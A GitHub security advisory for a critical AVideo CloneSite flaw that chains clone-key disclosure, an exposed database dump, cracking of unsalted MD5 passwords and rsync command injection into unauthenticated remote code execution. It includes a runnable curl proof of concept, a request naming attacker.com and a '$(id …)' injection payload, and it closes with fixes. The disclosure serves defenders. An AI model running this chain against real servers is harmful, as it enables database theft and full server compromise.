# [C] AVideo Multi-Chain Attack: Unauthenticated Remote Code Execution via Clone Key Disclosure, Database Dump, and Command Injection

## Summary
Severity: Critical
Advisory: GHSA-687q-32c6-8x68
CVE: CVE-2026-33478
CWE: CWE-284, CWE-78
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-687q-32c6-8x68
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

Multiple vulnerabilities in AVideo's CloneSite plugin chain together to allow a completely unauthenticated attacker to achieve remote code execution. The `clones.json.php` endpoint exposes clone secret keys without authentication, which can be used to trigger a full database dump via `cloneServer.json.php`. The dump contains admin password hashes stored as MD5, which are trivially crackable. With admin access, the attacker exploits an OS command injection in the rsync command construction in `cloneClient.json.php` to execute arbitrary system commands.

## Details

### Step 1: Clone Key Disclosure

`plugin/CloneSite/clones.json.php:1-8` has zero authentication:

```php
<?php
require_once '../../videos/configuration.php';
require_once $global['systemRootPath'] . 'plugin/CloneSite/Objects/Clones.php';
header('Content-Type: application/json');
$rows = Clones::getAll();
?>
{"data": <?php echo json_encode($rows); ?>}
```

The response includes the `key` field for every registered clone, which is the sole authentication credential for clone operations.

### Step 2: Database Dump via Stolen Key

`plugin/CloneSite/cloneServer.json.php:73-97` — once the key passes `Clones::thisURLCanCloneMe()`, the server executes `mysqldump` and writes the result to a web-accessible directory:

```php
$cmd = "mysqldump -u {$mysqlUser} -p'{$mysqlPass}' --host {$mysqlHost} "
    ." --default-character-set=utf8mb4 {$mysqlDatabase} {$tablesList} > $sqlFile";
exec($cmd . " 2>&1", $output, $return_val);
```

The SQL file path is returned in the JSON response and is downloadable.

### Step 3: Admin Credential Extraction

`objects/user.php:1798` — passwords are stored as unsalted MD5:

```php
$passEncoded = md5($pass);
```

The `users` table in the dump contains `user`, `password` (MD5), and `isAdmin` fields. MD5 hashes crack in seconds.

### Step 4: Command Injection via Rsync

`plugin/CloneSite/cloneClient.json.php:259` — the `videosDir` from the clone server response is interpolated unsanitized into the rsync command:

```php
$rsync = "sshpass -p '{password}' rsync -av ... {$objClone->cloneSiteSSHUser}@{$objClone->cloneSiteSSHIP}:{$json->videosDir} ...";
exec($cmd . " 2>&1", $output, $return_val);
```

An admin who controls a clone server (or an attacker who has become admin) can inject arbitrary commands via the `videosDir` field.

## PoC

```bash
# Step 1: Steal clone keys (unauthenticated)
curl -s 'http://target/plugin/CloneSite/clones.json.php' | jq '.data[0].key'
# Output: "a1b2c3d4e5f6..."

# Step 2: Trigger database dump
CLONE_KEY="a1b2c3d4e5f6..."
curl -s "http://target/plugin/CloneSite/cloneServer.json.php" \
  --data "url=http://attacker.com&key=${CLONE_KEY}&useRsync=0" | jq '.sqlFile'
# Output: "Clone_mysqlDump_1234567890.sql"

# Step 3: Download the dump and extract admin credentials
curl -s "http://target/videos/clones/Clone_mysqlDump_1234567890.sql" \
  | grep -A2 "INSERT INTO.*users" \
  | grep -oP "admin','[a-f0-9]{32}"
# Output: admin','5f4dcc3b5aa765d61d8327deb882cf99  (MD5 of "password")

# Step 4: Crack MD5 (trivial)
echo -n "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 0 rockyou.txt
# Output: password

# Step 5: Login as admin, configure CloneSite with malicious server
# The attacker's clone server returns videosDir containing: /tmp$(id > /tmp/pwned)
# When rsync executes, the $(id) is evaluated by the shell
```

## Impact

- **Complete server compromise**: Unauthenticated attacker achieves arbitrary command execution as the web server user
- **Full database disclosure**: The entire database (users, videos, configurations, secrets) is exfiltrated
- **No user interaction**: Every step is automated, no clicks or social engineering required
- **Credential theft**: All user passwords (MD5) are trivially recoverable
- **Lateral movement**: Database credentials and SSH credentials (stored encrypted in the plugins table) may enable access to other systems

## Recommended Fix

1. **Add authentication to `clones.json.php`:**
```php
// plugin/CloneSite/clones.json.php
require_once '../../videos/configuration.php';
if (!User::isAdmin()) {
    http_response_code(403);
    die(json_encode(['error' => true, 'msg' => 'Admin required']));
}
```

2. **Don't store SQL dumps in web-accessible directories** — use a path outside the web root or require re-authentication to download.

3. **Upgrade password hashing** — replace MD5 with `password_hash()` (bcrypt/argon2):
```php
// Replace: $passEncoded = md5($pass);
$passEncoded = password_hash($pass, PASSWORD_DEFAULT);
```

4. **Sanitize rsync command parameters** — use `escapeshellarg()` on all interpolated values:
```php
$rsync = sprintf("rsync -av ... %s@%s:%s ...",
    escapeshellarg($objClone->cloneSiteSSHUser),
    escapeshellarg($objClone->cloneSiteSSHIP),
    escapeshellarg($json->videosDir)
);
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-687q-32c6-8x68
- https://nvd.nist.gov/vuln/detail/CVE-2026-33478
- https://github.com/WWBN/AVideo/commit/c85d076375fab095a14170df7ddb27058134d38c
- https://github.com/WWBN/AVideo
